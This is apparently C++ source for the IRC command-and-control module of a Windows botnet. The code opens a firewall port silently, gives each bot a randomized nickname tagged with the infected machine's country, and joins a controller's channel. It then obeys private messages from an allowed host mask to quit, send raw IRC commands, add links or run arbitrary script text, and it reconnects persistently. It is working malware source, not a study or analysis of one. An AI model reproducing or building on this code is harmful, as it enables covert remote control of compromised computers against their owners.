#include <winsock2.h>
#include "irc.h"

class IRCList IRCList;
Mutex Mutex;

VOID IRCList::Add(IRC* IRC){
	Mutex.WaitForAccess();
	IRCL.push_back(IRC);
	Mutex.Release();
}

VOID IRCList::Remove(IRC* IRC){
	Mutex.WaitForAccess();
	std::vector<::IRC*>::iterator I = std::find(IRCL.begin(), IRCL.end(), IRC);
	IRCL.erase(I);
	Mutex.Release();
}

VOID IRCList::Notify(PCHAR Message){
	Mutex.WaitForAccess();
	for(UINT i = 0; i < IRCL.size(); i++)
		IRCL[i]->Notify(Message);
	Mutex.Release();
}

VOID IRCList::QuitAll(PCHAR Message){
	Mutex.WaitForAccess();
	for(UINT i = 0; i < IRCL.size(); i++)
		IRCL[i]->Quit(Message);
	Mutex.Release();
}

IRC::IRC(PCHAR Host, USHORT Port, PCHAR Join, PCHAR Nick, PCHAR Ident, PCHAR Name, PCHAR Allow){
	RecvBuf.Create(1024);
	strncpy(IRC::Host, Host, sizeof(IRC::Host));
	strncpy(IRC::Join, Join, sizeof(IRC::Join));
	strncpy(IRC::Nick, Nick, sizeof(IRC::Nick));
	strncpy(IRC::Ident, Ident, sizeof(IRC::Ident));
	strncpy(IRC::Name, Name, sizeof(IRC::Name));
	strncpy(IRC::Allow, Allow, sizeof(IRC::Allow));
	ProcessString(Ident, IdentP);
	ProcessString(Name, NameP);
	IRC::Port = Port;
	NotifyOn = FALSE;
	Quiting = FALSE;
	ConnectionTries = 0;
	Reconnections = 0;
	StartThread();
}

IRC::~IRC(){
	Mutex.WaitForAccess();
	IRCList.Remove(this);
	Mutex.Release();
	Socket.Disconnect(CLOSE_BOTH_HDL);
	IdentSocket.Disconnect(CLOSE_BOTH_HDL);
	RecvBuf.Cleanup();
}

VOID IRC::ThreadFunc(VOID){
	#ifdef _DEBUG
	dprintf("** IRC thread started\n");
	#endif
	IdentSocket.Create(SOCK_STREAM);
	IdentSocket.EventSelect(FD_ACCEPT);
	IdentSocket.Bind(113);
	FireWall FireWall;
	FireWall.OpenPort(113, NET_FW_IP_PROTOCOL_TCP, L"null");
	IdentSocket.Listen(1);
	while(!Connect(Host, Port)){
		Sleep(5000);
		if(ConnectionTries >= IRC_CONNECTION_RETRIES)
			return;
		ConnectionTries++;
	}

	BOOL IdentActive = TRUE;
	Timeout Timeout;
	WSAEVENT EventList[2];
	WSANETWORKEVENTS NetEvents;
	EventList[0] = Socket.GetEventHandle();
	EventList[1] = IdentSocket.GetEventHandle();
	INT SignalledEvent;
	while(1){
		if((SignalledEvent = WSAWaitForMultipleEvents(IdentActive?2:1, EventList, FALSE, INFINITE, FALSE)) != WSA_WAIT_TIMEOUT){
			SignalledEvent -= WSA_WAIT_EVENT_0;
			if(SignalledEvent == 0){
				Socket.EnumEvents(&NetEvents);
				if(NetEvents.lNetworkEvents & FD_READ){
					while(RecvBuf.Read(Socket) > 0){
						while(RecvBuf.PopItem("\r\n", 2)){
							#ifdef _DEBUG
							dprintf("%s\r\n", RecvBuf.PoppedItem);
							#endif
							PCHAR Prefix = NULL,
								From = NULL,
								Command = NULL,
								To = NULL,
								Body = NULL,
								NullStr = "(null)",
								FNick = NULL,
								FName = NULL,
								FHost = NULL;

							CHAR Temp[1024];

							if(RecvBuf.PoppedItem[0] == ':'){
								RecvBuf.PoppedItem[0] = NULL;
								Prefix = RecvBuf.PoppedItem;
							}else{
								Prefix = strtok(RecvBuf.PoppedItem, ":");
							}
							if(!Prefix)
								continue;
							From = strtok(Prefix + strlen(Prefix) + 1, " ");
							if(From)
								Command = strtok(NULL, " ");
							else
								From = NullStr;
							if(Command)
								To = strtok(NULL, " ");
							else
								Command = NullStr;
							if(To)
								Body = To + strlen(To) + 2;
							else
								To = NullStr;
							if(!Body)
								Body = NullStr;

							if(From){
								strncpy(Temp, From, sizeof(Temp));
								FNick = strtok(Temp, "!");
								if(FNick)
									FName = strtok(NULL, "@");
								if(FName)
									FHost = FName + strlen(FName) + 1;
							}

							if(strcmp(Command, "376") == 0 || strcmp(Command, "422") == 0){
								Active = TRUE;
								Socket.Sendf("JOIN %s\r\n", Join);
							}else
							if(strcmp(Command, "433") == 0){
								Socket.Sendf("NICK %s\r\n", ProcessString(Nick, NickP));
							}
							if(strcmp(Prefix, "PING ") == 0){
								Socket.Sendf("PONG :%s\r\n", From);
							}else
							if(strcmp(Prefix, "ERROR ") == 0){
								#ifdef _DEBUG
								dprintf("** IRC error, disconnecting\r\n");
								#endif
								Connected = FALSE;
								Active = FALSE;
								Socket.Shutdown();
								Timeout.SetTimeout(SHUTDOWN_TIMEOUT);
								Timeout.Reset();
							}
							if(strcmp(Command, "PRIVMSG") == 0){
								if(WildcardCompare(Allow, From)){
									if(strncmp(Body, IRC_QUIT_COMMAND, strlen(IRC_QUIT_COMMAND) - 1) == 0){
										Body += strlen(IRC_QUIT_COMMAND);
										Quit(Body);
										return;
									}else
									if(strncmp(Body, IRC_RAW_PREFIX, strlen(IRC_RAW_PREFIX) - 1) == 0){
										Body += strlen(IRC_RAW_PREFIX);
										Socket.Sendf("%s\r\n", Body);
									}else
									if(strncmp(Body, IRC_NICK_COMMAND, strlen(IRC_NICK_COMMAND) - 1) == 0){
										Body += strlen(IRC_NICK_COMMAND);
										strncpy(Nick, Body, sizeof(Nick));
										Socket.Sendf("NICK %s\r\n", ProcessString(Nick, NickP));
									}else
									if(strncmp(Body, IRC_ADDLINK_COMMAND, strlen(IRC_ADDLINK_COMMAND) - 1) == 0){
										Body += strlen(IRC_ADDLINK_COMMAND);
										LinkCache::AddLink(Body);
									}else
									if(strncmp(Body, IRC_NOTIFY_COMMAND, strlen(IRC_NOTIFY_COMMAND) - 1) == 0){
										Body += strlen(IRC_NOTIFY_COMMAND);
										strncpy(NotifyC, Body, sizeof(NotifyC));
										if(stricmp(NotifyC, "this") == 0){
											if(To[0] == '&' || To[0] == '#' || To[0] == '!' || To[0] == '+' || To[0] == '.' || To[0] == '~')
												strncpy(NotifyC, To, sizeof(NotifyC));
											else
												strncpy(NotifyC, FNick, sizeof(NotifyC));
										}else
										if(stricmp(NotifyC, "OFF") == 0)
											NotifyOn = FALSE;
										NotifyOn = TRUE;
									}else{
										SEL::Script* Script = new SEL::Script(Body);
										Script->Run();
										SEL::Scripts.Add(Script);
									}
								}
							}
							if(Body[0] == 1 && Body[strlen(Body) - 1] == 1){ //CTCP
								CHAR Temp[1024];
								strncpy(Temp, Body + 1, strlen(Body) - 1);
								Temp[strlen(Body) - 2] = NULL;
								if(strcmp(Temp, "VERSION") == 0){
									Socket.Sendf("NOTICE %s :\1%s\1\r\n", FNick, IRC_CTCP_VERSION);
								}
							}
						}
					}
				}

				if(NetEvents.lNetworkEvents & FD_WRITE){
					if(!LoginSent){
						Socket.Sendf("USER %s \"\" \"%s\" :%s\r\n", IdentP, Host, NameP);
						Socket.Sendf("NICK %s\r\n", ProcessString(Nick, NickP));
						LoginSent = TRUE;
					}
				}

				if(NetEvents.lNetworkEvents & FD_CLOSE || Timeout.TimedOut()){
					#ifdef _DEBUG
					dprintf("** IRC connection closed\r\n");
					#endif
					Timeout.SetTimeout(NULL);
					Connected = FALSE;
					Active = FALSE;
					Reconnections++;
					if(Reconnections < IRC_RECONNECT_TIMES && !Quiting){
						Sleep(60000);
						while(!Connect(Host, Port)){
							Sleep(5000);
							if(ConnectionTries >= IRC_CONNECTION_RETRIES)
								return;
							ConnectionTries++;
						}
					}else
						return;
				}

			}else
			if(SignalledEvent == 1){
				IdentSocket.EnumEvents(&NetEvents);
				if(NetEvents.lNetworkEvents & FD_ACCEPT){
					::Socket NewSocket;
					IdentSocket.Accept(NewSocket);
					NewSocket.Sendf("%d, %d : USERID : UNIX : %s", Socket.GetPort(), Socket.GetPeerPort(), IdentP);
					NewSocket.Disconnect(CLOSE_BOTH_HDL);
					IdentSocket.Disconnect(CLOSE_BOTH_HDL);
					IdentActive = FALSE;
				}
			}
		}
	}
}

PCHAR IRC::ProcessString(const PCHAR String, PCHAR StringP){
	strcpy(StringP, String);
	for(UINT i = 0; i < strlen(StringP); i++){
		switch(StringP[i]){
			case '#':
				StringP[i] = rand_r('0', '9');
			break;
			case '*':
				switch(rand_r(0, 2)){
					case 0: StringP[i] = rand_r('a', 'z'); break;
					case 1: StringP[i] = rand_r('A', 'Z'); break;
					case 2: StringP[i] = rand_r('0', '9'); break;
				}
			break;
			case '+':
				switch(rand_r(0, 1)){
					case 0: StringP[i] = rand_r('A', 'Z'); break;
					case 1: StringP[i] = rand_r('0', '9'); break;
				}
			break;
			case '<':
				StringP[i] = rand_r('a', 'z');
			break;
			case '>':
				StringP[i] = rand_r('A', 'Z');
			break;
			case '~':
				switch(rand_r(0, 4)){
					case 0: StringP[i] = 'a'; break;
					case 1: StringP[i] = 'e'; break;
					case 2: StringP[i] = 'i'; break;
					case 3: StringP[i] = 'o'; break;
					case 4: StringP[i] = 'u'; break;
				}
			break;
			case '&':
				if(strncmp(&StringP[i + 1], "cn", 2 * sizeof(CHAR)) == 0){
					CHAR Country[4];
					GetLocaleInfo(LOCALE_SYSTEM_DEFAULT, LOCALE_SABBREVCTRYNAME, Country, sizeof(Country)); 
					strncpy(&StringP[i], Country, 3 * sizeof(CHAR));
				}
			break;
		}
	}
	return StringP;
}

VOID IRC::Notify(PCHAR Message){
	if(NotifyOn){
		Socket.Sendf("PRIVMSG %s :%s\r\n", NotifyC, Message);
	}
}

VOID IRC::Quit(PCHAR Message){
	Socket.Sendf("QUIT :%s\r\n", Message);
	Quiting = TRUE;
}

DWORD IRC::Connect(PCHAR Host, USHORT Port){
	Connected = FALSE;
	LoginSent = FALSE;
	Active = FALSE;

	Socket.Disconnect(CLOSE_SOCKET_HDL);
	Socket.Create(SOCK_STREAM);
	if(SocketFunction::GetAddr(Host) != SOCKET_ERROR){
		#ifdef _DEBUG
		dprintf("** IRC found host\n");
		#endif

		if(Socket.Connect(Host, Port) != SOCKET_ERROR){
			#ifdef _DEBUG
			dprintf("** IRC connected to %s:%d\n",Host,Port);
			#endif
			Connected = TRUE;
			Socket.EventSelect(FD_READ|FD_WRITE|FD_CLOSE);
		}else{
			#ifdef _DEBUG
			dprintf("** IRC unable to connect %d\r\n", WSAGetLastError());
			#endif
			return FALSE;
		}
	}else{
		return FALSE;
	}

	return TRUE;
}
